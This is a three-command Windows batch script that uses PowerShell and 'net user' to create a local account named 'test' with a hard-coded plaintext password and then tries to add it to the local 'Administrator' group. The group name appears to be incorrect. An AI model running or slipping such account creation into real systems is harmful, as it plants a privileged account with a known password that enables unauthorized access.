@ECHO OFF & SETLOCAL EnableDelayedExpansion
powershell -command net user test Karolina06112022 /add
powershell -command net localgroup Administrator test /add

pause